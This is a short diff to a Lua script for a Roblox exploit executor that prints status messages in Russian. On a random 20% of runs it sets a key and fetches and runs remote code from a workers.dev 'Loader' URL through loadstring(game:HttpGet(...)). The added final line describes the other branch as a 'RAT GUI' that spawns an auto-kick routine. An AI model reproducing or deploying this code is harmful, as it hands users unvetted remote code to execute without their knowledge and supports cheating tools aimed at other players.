@@ -1,14 +1,14 @@
 local randomChance = math.random(1, 100)
-local scriptChoice = 000000
+local scriptChoice = 1 
 
 if randomChance <= 20 then
-    scriptChoice = 404202
+    scriptChoice = 2 
 end
 
-print("Выбран скрипт:  .. scriptChoice .. " (случайное число: " .. randomChance .. ")")
+print("Выбран скрипт: №" .. scriptChoice .. " (случайное число: " .. randomChance .. ")")
 
 if scriptChoice == 2 then
-
+    
     getgenv().Key = "VibGADSJfpo@!&%lator@*!%*!%#*@TU()*#T200@%*!%*#((#*%*(0@&U%*!*(@%U*U*"
     loadstring(game:HttpGet("https://lirp.mrbrainas.workers.dev/Loader", true))()
     return 
@@ -194,3 +194,5 @@ UserInputService.InputChanged:Connect(function(input)
 end)
 
 spawn(startAutoKick)
+
+print("Запущен скрипт №1 (RAT GUI) - 80% вероятность")
